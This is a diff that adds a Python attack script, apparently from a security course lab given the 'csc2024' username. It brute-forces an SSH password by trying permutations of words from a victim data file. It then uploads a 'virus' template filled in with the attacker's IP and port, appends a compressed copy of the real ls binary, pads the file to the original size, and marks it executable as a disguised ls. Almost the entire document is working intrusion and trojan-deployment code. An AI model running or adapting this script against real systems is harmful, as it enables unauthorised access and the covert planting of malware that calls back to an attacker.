@@ -1,0 +1,104 @@
+#!/usr/bin/env python3
+
+from itertools import combinations, permutations
+import paramiko
+import time
+import sys
+
+def dictionaryAttack(victim_ip, username):
+    with open("/app/victim.dat", "r") as v:
+        victim = v.read().splitlines()
+
+    for i in range(1, len(victim) + 1):
+        for c in combinations(victim, i):  # C(victim, i)
+            for p in permutations(c):
+                password = ''.join(p)
+                ssh_client = crackSSH(victim_ip, username, password)
+                if ssh_client:
+                    return ssh_client
+    return None
+
+
+def crackSSH(victim_ip, username, password):
+    print("Username:", username, ", Password:", password)
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh_client.connect(hostname=victim_ip, username=username, password=password, auth_timeout=1, timeout=5, banner_timeout=5)
+        print("- Connected!\n")
+        return ssh_client
+    except paramiko.AuthenticationException:
+        print("- Authentication failed!")
+        return None
+    except Exception as e:
+        print("-", e, "! Try again...")
+        time.sleep(1)
+        return crackSSH(victim_ip, username, password)
+
+
+def infect(ssh_client, attacker_ip, attacker_port):
+    virus_path = "/app/ls"
+    
+    with open("virus", "r") as v:
+        virus = v.read()
+        
+    # Replace the ip and port in the virus code
+    virus = virus.replace("server_ip", attacker_ip)
+    virus = virus.replace("server_port", attacker_port)
+    
+    # Find the path of ls
+    _, stdout, _ = ssh_client.exec_command("which ls")  
+    ls_path = stdout.read().decode().strip()
+    # print("original ls path:", ls_path)
+
+    # Find the size of ls
+    _, stdout, _ = ssh_client.exec_command(f"ls -l {ls_path} | awk '{{print $5}}'")  
+    ls_size = stdout.read().decode().strip()
+    print("original ls size:", ls_size)
+    
+    # Find the size of compressed ls
+    _, stdout, _ = ssh_client.exec_command(f"zip -q zip_ls {ls_path} && ls -l zip_ls.zip | awk '{{print $5}}'")  
+    zip_ls_size = stdout.read().decode().strip()
+    virus = virus.replace('zip_ls_size', f'{zip_ls_size}')  # Replace the size in the virus code
+    print("compressed ls size:", zip_ls_size)
+    
+    # Calculate the virus payload
+    virus_payload = len(virus)
+    # print("virus payload:", virus_payload)
+    virus_payload += len(str(virus_payload)) - len("virus_payload")
+    virus = virus.replace('virus_payload', f'{virus_payload}')
+    print("virus payload:", virus_payload)
+    
+    # Write the virus to the victim
+    with open("new_virus", "w") as v:
+        v.write(virus)
+
+    trans = ssh_client.get_transport()
+    sftp = paramiko.SFTPClient.from_transport(trans)
+    sftp.put(localpath='./new_virus', remotepath=virus_path)
+
+    # Append the compressed ls
+    ssh_client.exec_command(f"cat zip_ls.zip >> {virus_path} && rm -f zip_ls.zip")
+    # Append the padding
+    ssh_client.exec_command(f"truncate -s $(({ls_size} - 4)) {virus_path}")
+    # Sign the virus
+    ssh_client.exec_command(f"echo -n 'aabbccdd' | xxd -r -p >> {virus_path};")
+    ssh_client.exec_command(f"chmod +x {virus_path};")
+    print("Victim Infected!")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage:", sys.argv[0], "<victim_ip> <attacker_ip> <attacker_port>")
+        sys.exit(1)
+        
+    victim_ip = sys.argv[1]
+    attacker_ip = sys.argv[2]
+    attacker_port = sys.argv[3]
+
+    ssh_client = dictionaryAttack(victim_ip, "csc2024")
+    if not ssh_client:
+        print("Cannot find the password!")
+        sys.exit(1)
+
+    infect(ssh_client, attacker_ip, attacker_port)
